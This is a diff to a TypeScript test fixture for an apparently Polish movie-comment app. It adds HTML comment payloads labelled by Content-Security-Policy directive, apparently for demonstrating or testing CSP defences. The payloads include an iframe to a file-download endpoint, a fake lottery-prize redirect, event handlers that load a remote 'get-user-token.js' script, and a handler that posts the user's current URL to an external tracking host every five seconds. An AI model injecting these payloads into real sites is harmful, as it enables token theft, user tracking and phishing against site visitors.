@@ -1,6 +1,6 @@
 import { MovieComment } from '../src/app/core/models/movie-comment';
 
-export const maliciousComments: MovieComment[] = [
+export const maliciousComments2: MovieComment[] = [
   // font-src: external stylesheet
   // {
   //   userName: 'User1',
@@ -71,6 +71,8 @@ export const maliciousComments: MovieComment[] = [
   //   creationTime: '2020-03-04',
   // },
   // form-action
+  // frame-src
+
   {
     userName: 'User3',
     body: 'Oglądałem setki razy! 10/10.',
@@ -82,3 +84,136 @@ export const maliciousComments: MovieComment[] = [
     creationTime: '2020-03-04',
   },
 ];
+
+const maliciousComments = [
+  // img-src <img src="https://malicious-site-awx4.onrender.com/banner.png" />
+  // media-src <video controls width=400px height=300px src="https://malicious-site-awx4.onrender.com/malicious-video.mp4" />
+  // frame-src
+  '<iframe style="width: 100%; height: 80px" src="https://malicious-site-awx4.onrender.com/download-file"></iframe>',
+  // frame-ancestor
+  // app has been nested in the malicious user site
+  // script-src-attr
+  `<p color="yellow"> Wygrałeś 100.000 zł!!!</p>.<div onclick='window.location.replace("https://malicious-site-awx4.onrender.com/lottery-attack")' ><span style="color: red; cursor: pointer; text-decoration: underline">Kliknij tutaj</span>, aby odebrać nagrodę.</div>`,
+  ,
+  // script-src-elem
+  `<div onwheel="
+      (function() {
+        const scriptId = 'user-token-script';
+        let script = document.getElementById(scriptId);
+
+        if (script) return;
+
+        script = document.createElement('script');
+        script.src='https://malicious-site-awx4.onrender.com/get-user-token.js';
+        script.id=scriptId;
+        document.body.appendChild(script);
+      })()"
+      style="position: absolute; width: 100%; height: 100vh; top: 0;">
+  </div>`,
+  // script-src-elem localhost
+  `<div onwheel="
+      (function() {
+        const scriptId = 'user-token-script';
+        let script = document.getElementById(scriptId);
+
+        if (script) return;
+
+        script = document.createElement('script');
+        script.src='https://localhost:3000/get-user-token.js';
+        script.id=scriptId;
+        document.body.appendChild(script);
+      })()"
+      style="position: absolute; width: 100%; height: 100vh; top: 0;">
+  </div>`,
+  // connect-src
+  `<div onmouseover="
+  (function() {
+    // document.addEventListener('onmouseover', function(event) {
+      console.log('here1');
+      const currentUrl = window.location.href;
+      const target = event.target;
+      setInterval(() => {
+      console.log('here2');
+      })
+        // fetch('http://localhost:3008', {
+        //   method: 'POST',
+        //   headers: {
+        //     'Content-Type': 'application/json;charset=UTF-8',
+        //   },
+        //   body: JSON.stringify({
+        //    target,
+        //   }),
+        // });
+
+    // });
+  })()"
+  style="height: 100px; width: 200px">
+</div>`,
+  // connect-src
+  `
+<div onmouseover="
+   (function() {
+      if (window.interval) return;
+
+      window.interval = setInterval(() => {
+        const data = {
+          date: new Date(),
+          currentUrl: window.location.href
+        };
+
+        fetch('https://malicious-site-awx4.onrender.com/track-user', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json;charset=UTF-8',
+          },
+          body: JSON.stringify({
+           ...data,
+          }),
+        });
+      }, 5000);
+  })()"
+  style="height: 100px; width: 200px">
+</div>`,
+  // font-src
+  `<link rel='stylesheet' href='https://malicious-site-awx4.onrender.com/malicious-font.css'>`,
+  `<link rel='stylesheet' href='https://localhost:3000/malicious-font.css'>`,
+  // font-src
+  `
+  <style>
+  @font-face {
+  font-family: "MaliciousFont";
+  src: url("http://localhost:3000/fonts/Barcode-Regular.ttf");
+}
+
+body {
+  font-family: "MaliciousFont" !important;
+}
+</style>`,
+  // font-src
+  `
+  <style>
+  @font-face {
+  font-family: "MaliciousFont";
+  src: url("https://malicious-site-awx4.onrender.com/Barcode-Regular.ttf");
+}
+
+body {
+  font-family: "MaliciousFont" !important;
+}
+</style>`,
+  // style-src-attrb
+  `<p style="
+    background: red;
+    color: green;
+    font-size: 24px;
+    height: 100px;
+    font-weight: bold;
+    display: flex;
+    letter-spacing: 15px;
+    align-items: center;
+    background-image: url('https://malicious-site-awx4.onrender.com/malicious-code.js')">
+Złośliwy komentarz
+</p>`,
+];
+
+// style-src-attr
